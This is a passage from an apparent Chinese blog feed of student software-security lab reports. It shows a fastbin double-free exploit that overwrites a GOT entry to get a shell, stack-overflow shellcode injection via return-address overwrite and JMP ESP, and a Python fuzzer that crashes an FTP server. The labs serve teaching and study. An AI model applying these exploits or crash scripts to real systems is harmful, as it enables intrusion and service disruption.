<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202232353.png"></p>
</li>
</ul>
<h2 id="第二次malloc"><a href="#第二次malloc" class="headerlink" title="第二次malloc"></a>第二次<code>malloc</code></h2><p>在<code>double free</code>之后，我们使得链表的形式为<code>0xb2c000—▸0xb2c070◂—0xb2c000</code>，再次<code>malloc</code>时，会从链表末尾取下一个块，直接分配给用户，所以malloc到的2号实际上是<code>0xb2c000</code>，对该块进行编辑时，编辑起始的位置是<code>0xb2c0e0</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 2 </span></span><br><span class="line">Write(p, <span class="number">2</span>, p64(<span class="number">0x60208d</span>))</span><br></pre></td></tr></table></figure>

<p>在执行过write 2 之后，地址<code>0xb2c070</code>位置被改变了，变成了<code>0x60208d</code>。由于<code>0xb2c000</code>仍然被记录在链表中，所以fastbins中链表的最后一项也发生了改变；</p>
<p>修改了的fastbin链表，导致的是0x60208d这块被当做了fastbin的一个块，在分配的时候，申请的0x60大小实际上会分配0x70大小，而0x7f，也就是图中的0x60802d开始的第二个字节，恰好满足分配的条件，如果再往左或往右偏移，会出现不满足条件的情况；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202233043.png"></p>
<p>接下来进行了三次<code>malloc</code>操作，每一次<code>malloc</code>操作都会从fastbin链表头取一个块进行分配；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 3 </span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 4 </span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>取第一个块进行分配，分配<code>0xb2c070</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202233833.png"></p>
</li>
<li><p>取第二个块进行分配，分配<code>0xb2c000</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202234038.png"></p>
</li>
<li><p>第三次分配，把<code>0xb2c070</code>写入<code>ptr[5]</code>中，fastbin只剩下了之前0x60208d这个地址里面的内容；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202234547.png"></p>
</li>
<li><p>查看<code>ptr</code>所在的地方，可以看到<code>ptr[0]=ptr[2]=ptr[4]</code>、<code>ptr[1]=ptr[3]</code>，而<code>ptr[5]</code>是<code>bss</code>段上的一个地址；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202234841.png"></p>
</li>
</ul>
<h2 id="第三次malloc"><a href="#第三次malloc" class="headerlink" title="第三次malloc"></a>第三次<code>malloc</code></h2><p>接下来需要进行任意写，更改<code>got</code>表里某一函数的地址为system，并写入参数<code>/bin/sh</code>；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Write(p, <span class="number">4</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) * <span class="number">3</span></span><br><span class="line">Write(p, <span class="number">5</span>, payload)</span><br><span class="line">Write(p, <span class="number">2</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">Delete(p, <span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202235645.png"></p>
<p>在向5写入payload之后，也就是向<code>bss</code>段上的<code>ptr</code>写入payload，把0、1、2这三个的<code>ptr</code>都改为了free的got所在的地址<code>0x602018</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203000504.png"></p>
<p><code>ptr</code>地址</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203000629.png"></p>
<p>执行write 2之后，free函数<code>got</code>表的位置，理论上被写成<code>system</code>函数的地址，但是由于掌握不熟练，一直没有调试到地址位置<code>0x4006E0</code>；</p>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a><code>get shell</code></h2><p>此时程序已经<code>get shell</code>完毕，可以执行命令如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203002114.png"></p>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>重复释放漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞技术利用实验</title>
    <url>/%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>了解<code>shellcode</code>注入原理</li>
<li>理解给出的弹出对话框的汇编代码</li>
<li>通过淹没静态地址来实现<code>shellcode</code>的代码植入</li>
<li>通过跳板来实现<code>shellcode</code>的代码植入</li>
<li>尝试修改汇编语句的<code>shellcode</code>实现修改标题等简单操作 <span id="more"></span></li>
</ol>
<h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">44</span>];</span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!	</span></span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	FILE * fp;</span><br><span class="line">	LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);<span class="comment">//prepare for messagebox</span></span><br><span class="line">	<span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">	valid_flag = verify_password(password);</span><br><span class="line">	<span class="keyword">if</span>(valid_flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>头文件中包含<code>windows.h</code>，方便调用<code>LoadLibrary()</code>函数去装载<code>user32.dll</code>，以便在植入的代码中调用<code>MseeageBox</code></li>
<li>在主函数打开程序同目录下的<code>password.txt</code>文件并读取文件内容即密码，若无法打开，则直接退出程序</li>
<li>跳转到子函数<code>verify_password()</code>判断输入的密码是否正确即判断输入的密码<code>password</code>与正确的密码<code>1234567</code>是否相等,如果相等则子函数返回<code>0</code>，否则返回非<code>0</code>，在函数返回之前将输入的<code>password</code>拷贝到数组<code>buffer[44]</code>里面</li>
<li>主函数在判断子函数<code>verify_password()</code>返回值：如果是<code>0</code>，则输出<code>Congratulation! You have passed the</code><br><code>verification!</code>，关闭<code>password.txt</code>文件，结束程序，否则输出<code>incorrect password!</code>，关闭<code>password.txt</code>文件，结束程序</li>
</ol>
<h1 id="通过淹没静态地址来实现shellcode的代码植入"><a href="#通过淹没静态地址来实现shellcode的代码植入" class="headerlink" title="通过淹没静态地址来实现shellcode的代码植入"></a>通过淹没静态地址来实现<code>shellcode</code>的代码植入</h1><ol>
<li><p>使用<code>Depends.exe</code>对程序<code>overflow.exe</code>进行剖析(参数保持默认)</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836316689.png" alt="1565836316689"></p>
<ol>
<li><p>点击<code>kernel32.dll</code>，在右侧窗口找到<code>exitprocess</code>的函数入口点为<code>0x0001B0BB</code>，在下方窗口找到<code>kernel32.dll</code>的实际基址为<code>0x77E60000</code>，两个地址相加可得<code>exitprocess</code>的入口地址：<code>0x77E8B0B0</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836376754.png" alt="1565836376754"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836386263.png" alt="1565836386263"></p>
</li>
<li><p>同理在<code>user32.dll</code>，在右侧窗口找到<code>MessageBoxA</code>的函数入口点为<code>0x00033D68</code>，在下方窗口找到user32.dll的实际基址为<code>0x77DF0000</code>，两个地址相加可得<code>MessageBoxA</code>的入口地址：<code>0x77E23D68</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836456007.png" alt="1565836456007"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836461058.png" alt="1565836461058"></p>
</li>
</ol>
</li>
<li><p>打开<code>shellcode</code>文件源码并阅读、理解，在工程文件<code>overflow</code>同目录下新建项目<code>shellcode</code>，将源代码拷贝并作出相应更改：将弹出框标题改为<code>ABCD1234</code>，将<code>exitprocess</code>的入口地址改为<code>0x77E8B0B0</code>，将<code>MessageBoxA</code>的入口地址改为<code>0x77E23D68</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	<span class="type">char</span> dllbuf[<span class="number">11</span>] = <span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">	_asm&#123;</span><br><span class="line">		sub sp,<span class="number">0x440</span></span><br><span class="line">		xor ebx,ebx</span><br><span class="line">		push ebx</span><br><span class="line">		push <span class="number">0x34333231</span>		<span class="comment">//1234</span></span><br><span class="line">		push <span class="number">0x44434241</span>		<span class="comment">//ABCD</span></span><br><span class="line"></span><br><span class="line">		mov eax,esp</span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push eax</span><br><span class="line">		push ebx</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0x77E23D68</span>	<span class="comment">//messageboxA  入口地址</span></span><br><span class="line">		call eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,<span class="number">0x77E7B0BB</span>	<span class="comment">//exitprocess  入口地址</span></span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下图，对话框正常弹出</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845037488.png" alt="1565845037488"></p>
</li>
<li><p>使用<code>ollydbg</code>打开新建的<code>shellcode.exe</code>文件，分析获取弹对话框部分的<code>shellcode</code></p>
<ol>
<li><p>定位到<code>shellcode</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845700629.png" alt="1565845700629"></p>
</li>
<li><p>将<code>shellcode</code>内容复制为文件如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845769821.png" alt="1565845769821"></p>
</li>
</ol>
</li>
<li><p>使用<code>ollydbg</code>打开<code>overflow.exe</code>文件，在<code>strcpy</code>处设置断点，当程序运行到此处时，缓冲区中的<code>dest</code>指向的地址<code>0x12FAF0</code>即为要注入的<code>shellcode</code>的起始地址</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846024211.png" alt="1565846024211"></p>
</li>
<li><p>构建<code>password.txt</code>以注入<code>shellcode</code></p>
<ol>
<li><p>用<code>UltraEdit</code>新建<code>password.txt</code>，并切换成<code>16</code>进制编辑的方式</p>
</li>
<li><p>根据栈中的位置计算返回地址应该在<code>44(buff) +</code><br><code>4(authenticated) + 4(EBP) = 52</code>的偏移后的第<code>53-56</code>字节</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845495853.png" alt="1565845495853"></p>
</li>
<li><p>构造的txt文件，格式为<code>Shellcode+若干0x90 +shellcode在缓冲区的起始地址</code></p>
<p>即通过调整<code>0x90</code>的数量来保证第<code>53-56</code>字节是<code>shellcode</code>在缓冲区的起始地址</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846378550.png" alt="1565846378550"></p>
</li>
<li><p>完成后保存到<code>overflow_exe</code>项目的<code>debug</code>目录下，运行 <code>exe</code>程序，弹出对话框。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846426783.png" alt="1565846426783"></p>
</li>
</ol>
</li>
</ol>
<h1 id="通过跳板来实现shellcode的代码植入"><a href="#通过跳板来实现shellcode的代码植入" class="headerlink" title="通过跳板来实现shellcode的代码植入"></a>通过跳板来实现<code>shellcode</code>的代码植入</h1><ol>
<li><p>使用<code>ollydbg</code>打开<code>overflow.exe</code>文件</p>
</li>
<li><p>在<code>strcpy</code>函数上设置断点，运行至断点。然后右键选择<code>overflow return address -&gt;ASCII overflow returns -&gt;search JMP/CALL ESP</code>，搜索<code>JMP/CALL ESP</code>语句，并点击日志查看,选择一条在<code>user32</code>中的<code>JMP ESP</code>指令，记录地址<code>0x77E2E32A</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846888982.png" alt="1565846888982"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847088620.png" alt="1565847088620"></p>
</li>
<li><p>更改<code>password.txt</code>文件，其结构为 <code>52字节填充物 + 4字节JMP ESP地址(逆 序) + shellcode + 若干0x90</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847313872.png" alt="1565847313872"></p>
</li>
<li><p>运行overflow.exe，对话框弹出</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847560360.png" alt="1565847560360"></p>
</li>
</ol>
<h1 id="修改汇编语句的shellcode实现修改标题"><a href="#修改汇编语句的shellcode实现修改标题" class="headerlink" title="修改汇编语句的shellcode实现修改标题"></a>修改汇编语句的<code>shellcode</code>实现修改标题</h1><ol>
<li><p>将标题修改为软件安全，新建shellcode1代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	<span class="type">char</span> dllbuf[<span class="number">11</span>] = <span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">	_asm&#123;</span><br><span class="line">		sub sp,<span class="number">0x440</span></span><br><span class="line">		xor ebx,ebx</span><br><span class="line">		push ebx</span><br><span class="line"></span><br><span class="line">		push <span class="number">0xABC8B2B0</span>		<span class="comment">//安全</span></span><br><span class="line">		push <span class="number">0XFEBCEDC8</span>		<span class="comment">//软件</span></span><br><span class="line">		push <span class="number">0x00000000</span>		<span class="comment">//阻断</span></span><br><span class="line">		push <span class="number">0x34333231</span>		<span class="comment">//1234</span></span><br><span class="line">		push <span class="number">0x44434241</span>		<span class="comment">//ABCD</span></span><br><span class="line"></span><br><span class="line">		mov eax,esp</span><br><span class="line">		push ebx <span class="comment">//MB_OK</span></span><br><span class="line">		add eax, <span class="number">12</span></span><br><span class="line">		push eax <span class="comment">//title</span></span><br><span class="line">		sub eax, <span class="number">12</span></span><br><span class="line">		push eax <span class="comment">//text</span></span><br><span class="line">		push ebx <span class="comment">//NULL</span></span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0x77E23D68</span>	<span class="comment">//messageboxA  入口地址</span></span><br><span class="line">		call eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,<span class="number">0x77E7B0BB</span>	<span class="comment">//exitprocess  入口地址</span></span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>程序运行结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847876404.png" alt="1565847876404"></p>
</li>
</ol>
<h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        <code>shellcode</code>是利用特定漏洞的二进制代码，利用缓冲区溢出等原理达到获取权限的目的。本次实验通过查找并计算所需函数的入口地址，得到一段汇编语言写的<code>shellcode</code>代码，并通过淹没静态地址和利用跳板的方法两种方法成功进行了<code>shellcode</code>代码注入，更深一步了解了函数跳转的原理，同时也明白了<code>shellcode</code>代码植入的危害性。实验过程中发现如果shellcode的地址含有空(<code>\0</code>)，<code>shellcode</code>会被截断。其中修改原理图示如下:</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848011587.png" alt="1565848011587"></p>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>在不修改<code>StackOverrun</code>程序源代码的情况下，构造<code>shellcode</code>，通过<code>jmp esp</code>的方式实现通过记事本打开<code>shellcode.txt</code>（可使用<code>CreateProcessA</code>或<code>WinExec</code>等<code>API</code>）</p>
<ol>
<li><p>使用<code>OllyDbg</code>查找程序<code>StackOverrun.exe</code>中的<code>jmp esp</code>的地址，选取其中一个：<code>0x77F8948B</code>，将其作为返回地址进行修改。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848379938.png" alt="1565848379938"></p>
</li>
<li><p>程序运行结束时，使用<code>JMP ESP</code>指令跳转到<code>ESP</code>地址处，单步运行，查看<code>EBP</code>为<code>0x0012FFC0</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848390125.png" alt="1565848390125"></p>
</li>
<li><p>在地址<code>0x0012FF74</code>处修改成如下汇编语句</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848400080.png" alt="1565848400080"></p>
</li>
<li><p>构造<code>shellcode</code>结构：<code>12字节填充物 + jmp esp地址 + 汇编机器码 + notepad&quot; &quot;shellcode</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848407673.png" alt="1565848407673"></p>
</li>
<li><p>使用命令行运行程序，参数为上述<code>shellcode</code>的<code>txt</code>文本形式</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848414568.png" alt="1565848414568"></p>
</li>
<li><p>运行程序后显示未找到<code>shellcode.txt</code>，显示是否新建文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848422212.png" alt="1565848422212"></p>
</li>
<li><p>根据提示，新建<code>txt</code>文件，内容为<code>123</code>，再次使用命令行运行程序，发现成功打开新建的<code>shellcode.txt</code>文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848427852.png" alt="1565848427852"></p>
</li>
<li><p>搜索该新建的<code>shellcode.txt</code>文件，发现其在<code>C</code>盘目录下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848433371.png" alt="1565848433371"></p>
</li>
<li><p>分析原因，可能是<code>shellcode</code>构造时汇编语言不精确导致的，现在还未弄清楚。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞挖掘与模糊测试实验</title>
    <url>/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>了解<code>fuzz</code>的基本原理；</li>
<li>通过<code>FtpFuzz</code>来<code>fuzz easy ftp server</code>的服务器，使服务器停止工作；</li>
<li>自己编写或修改<code>Python</code>脚本来自己编写<code>FTP FUZZ</code>简单工具，并用其来对<code>Home Ftp Server</code>进行<code>Fuzz</code>,使服务器停止工作，可以用<code>OllyDbg</code>附加查看异常。 <span id="more"></span></li>
</ol>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><table>
<thead>
<tr>
<th align="center">软件</th>
<th align="center">版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">服务器端</td>
<td align="center">Win 2000</td>
</tr>
<tr>
<td align="center">客户端</td>
<td align="center">Win 2000</td>
</tr>
<tr>
<td align="center"><code>Quick Easy Ftp Server</code></td>
<td align="center">3.1 Lite</td>
</tr>
<tr>
<td align="center"><code>Infigo FTPStress Fuzzer</code></td>
<td align="center">V1.0</td>
</tr>
<tr>
<td align="center"><code>Home Ftp Server</code></td>
<td align="center">1.10.1</td>
</tr>
</tbody></table>
<h1 id="通过FtpFuzz来fuzz-easy-ftp-server的服务器，使服务器停止工作"><a href="#通过FtpFuzz来fuzz-easy-ftp-server的服务器，使服务器停止工作" class="headerlink" title="通过FtpFuzz来fuzz easy ftp server的服务器，使服务器停止工作"></a>通过<code>FtpFuzz</code>来<code>fuzz easy ftp server</code>的服务器，使服务器停止工作</h1><ol>
<li><p>使用<code>Quick’n Easy FTP server</code>搭建服务器，开放匿名用户</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854306571.png" alt="1565854306571"></p>
</li>
<li><p>设置<code>FTP</code>的目录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854387309.png" alt="1565854387309"></p>
</li>
<li><p>开放<code>Download</code>权限，并启动服务器</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854408500.png" alt="1565854408500"></p>
</li>
<li><p>打开<code>ftpfuzz</code>的<code>exe</code>文件，进行服务器的<code>FUZZ</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854432527.png" alt="1565854432527"></p>
</li>
<li><p>左下角下拉框选择<code>Deselect All</code>，然后在<code>USER</code>选项和<code>PASS</code>选项中的<code>Command Argument</code>中填入<code>anonymous</code>，在LIST选项中选中<code>fuzz this ftp command</code>选项</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854595402.png" alt="1565854595402"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854601231.png" alt="1565854601231"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854607650.png" alt="1565854607650"></p>
</li>
<li><p>点击<code>config</code>菜单，在<code>Fuzzing data</code>中设定要设置的脏数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854685778.png" alt="1565854685778"></p>
</li>
<li><p>设置<code>FTP</code>主机的<code>IP</code>地址，点击<code>start</code>开始<code>fuzz</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854760808.png" alt="1565854760808"></p>
</li>
<li><p>启动<code>fuzzer</code>后可以观察到相关的信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854812857.png" alt="1565854812857"></p>
</li>
<li><p>红字的部分说明了已经<code>fuzz</code>成功，<code>FTP</code>服务器因脏数据而崩溃</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854830715.png" alt="1565854830715"></p>
</li>
<li><p>打开<code>FTP</code>主机的情况，发现的确崩溃，<code>fuzz</code>生效</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854863418.png" alt="1565854863418"></p>
</li>
</ol>
<h1 id="编写或修改Python脚本来自己编写FTP-FUZZ简单工具，并用其来对Home-Ftp-Server进行Fuzz-使服务器停止工作"><a href="#编写或修改Python脚本来自己编写FTP-FUZZ简单工具，并用其来对Home-Ftp-Server进行Fuzz-使服务器停止工作" class="headerlink" title="编写或修改Python脚本来自己编写FTP FUZZ简单工具，并用其来对Home Ftp Server进行Fuzz,使服务器停止工作"></a>编写或修改<code>Python</code>脚本来自己编写<code>FTP FUZZ</code>简单工具，并用其来对<code>Home Ftp Server</code>进行<code>Fuzz</code>,使服务器停止工作</h1><ol>
<li><p>打开<code>Home FTP Server</code>程序，点击<code>New Member</code>创建新成员，填入相关信息：<code>User name: Levi ; Password: root</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854960261.png" alt="1565854960261"></p>
</li>
<li><p>启动<code>Home FTP Server</code>，在<code>URL</code>中输入：<code>ftp://10.122.237.117/</code>，并使用用户名和密码登录后显示如下，说明服务器正常运行</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855030266.png" alt="1565855030266"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855066435.png" alt="1565855066435"></p>
</li>
<li><p>编写<code>fuzz.py</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ftp</span>(<span class="params">ip,port,user,passwd</span>):</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)		//建立socket连接</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        connect=s.connect((ip,port))		//连接主机</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Connected!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[!] Connected failed!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;USER %s\r\n&#x27;</span>%user)			//发送用户名</span><br><span class="line">    <span class="built_in">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;PASS %s\r\n&#x27;</span>%passwd)		//发送密码</span><br><span class="line">    <span class="built_in">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Sending payload...&quot;</span></span><br><span class="line">    s.send(<span class="string">&#x27;site index &#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">272</span>*<span class="number">1</span>+<span class="string">&#x27;\r\n&#x27;</span>)	//发送脏数据</span><br><span class="line">    s.send(<span class="string">&#x27;site index &#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">272</span>*<span class="number">2</span>+<span class="string">&#x27;\r\n&#x27;</span>)	//发送脏数据(发送一次无法实现服务器崩溃)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;failed&#x27;</span>					//出现异常说明可能出现了漏洞</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;succeed&#x27;</span></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ftp(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">21</span>,<span class="string">&#x27;Levi&#x27;</span>,<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>运行<code>fuzz.py</code>脚本，查看运行结果，显示<code>failed</code>说明无法访问服务器，返回的数据是发送的脏数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855312803.png" alt="1565855312803"></p>
</li>
<li><p>查看服务器，发现服务器已经停止运行</p>
